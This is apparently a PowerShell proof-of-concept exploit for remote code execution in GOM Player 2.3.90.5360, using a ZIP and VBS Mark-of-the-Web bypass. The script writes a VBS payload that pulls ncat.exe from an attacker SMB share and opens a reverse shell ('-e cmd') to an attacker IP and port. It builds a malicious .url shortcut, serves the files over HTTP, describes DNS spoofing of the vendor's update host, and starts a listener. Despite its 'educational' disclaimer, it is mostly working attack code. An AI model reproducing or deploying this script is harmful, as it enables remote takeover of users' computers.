# PoC for GOM Player 2.3.90.5360 - Remote Code Execution (RCE)
# Uses ZIP + VBS MoTW bypass technique for code execution
# WARNING: This is for educational purposes only.

# Target variables (adjust as needed)
$attackerIP = "192.168.1.100"  # Attacker SMB server IP
$attackerPort = "4444"          # Port for reverse shell listener
$gomVulnerableUrl = "playinfo.gomlab.com" # GOM Player vulnerable URL

# Banner
Write-Host "====================================================="
Write-Host " GOM Player 2.3.90.5360 - Remote Code Execution (RCE)"
Write-Host " Exploit PoC using ZIP+VBS MoTW bypass technique"
Write-Host "====================================================="

# Check for admin privileges
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] This script requires admin privileges."
    exit
}

# Payload creation
Write-Host "[*] Creating malicious VBS payload for reverse shell..."
$payload = @"
Set shell=CreateObject("WScript.Shell")
shell.Run("xcopy /y \\$attackerIP\share\ncat.exe %temp%")
WScript.Sleep 5000
shell.Run("cmd /c start /min cmd /c %temp%\ncat.exe $attackerIP $attackerPort -e cmd")
"@
$payloadPath = "$env:TEMP\payload.vbs"
$payload | Out-File -Encoding ASCII $payloadPath

# Create URL file that triggers the VBS payload from the SMB share
Write-Host "[*] Creating URL shortcut for MoTW bypass..."
$urlContent = "[InternetShortcut]`nURL=file://$attackerIP/share/archive.zip/payload.vbs`nIDList="
$urlPath = "$env:TEMP\Updater.url"
$urlContent | Out-File -Encoding ASCII $urlPath

# Zip the VBS payload for delivery
Write-Host "[*] Zipping the payload for delivery..."
$zipPath = "$env:TEMP\archive.zip"
Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
[System.IO.Compression.ZipFile]::CreateFromDirectory($env:TEMP, $zipPath)

# Deliver the payload via web server (optional: adjust based on your setup)
Write-Host "[*] Starting HTTP server to deliver ZIP file..."
$webroot = $env:TEMP
Start-Process powershell -ArgumentList "Start-Process -NoNewWindow -FilePath 'python' -ArgumentList '-m http.server 80 --directory $webroot'"

# Stage the attack
Write-Host "[*] Redirecting GOM Player's insecure HTTP connection..."
Write-Host "[*] Spoofing DNS to redirect $gomVulnerableUrl to malicious SMB server..."

# DNS Spoofing (manual step or via another tool, as DNS manipulation cannot be directly done via PowerShell)
# Here we simulate DNS spoofing for educational purposes. In practice, tools like DNSSpoof would handle this.

Write-Host "[*] Waiting for the target to execute the malicious URL shortcut..."

# Listen for reverse shell
Write-Host "[*] Launching reverse shell listener on port $attackerPort..."
Start-Process -NoNewWindow -FilePath 'nc.exe' -ArgumentList "-lvnp $attackerPort"